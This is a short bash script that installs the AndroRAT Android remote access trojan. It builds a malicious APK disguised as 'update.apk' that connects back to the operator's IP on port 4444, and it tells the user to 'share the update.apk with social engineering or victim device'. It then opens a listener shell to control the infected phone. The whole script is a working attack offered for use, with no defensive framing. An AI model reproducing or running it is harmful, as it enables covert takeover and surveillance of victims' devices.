#!/bin/bash


apt install git
git clone https://github.com/karma9874/AndroRAT.git
cd AndroRAT
ls
pip install -r requirements.txt

echo -n "Enter your IP : " 
read IP


python3 androRAT.py --build -i "$IP" -p 4444 -o update.apk 


echo "share the update.apk with social engineering or victim device and open "
echo "program checking victim"

cd AndroRAT
python3 androRAT.py --shell -i 0.0.0.0 -p 4444 

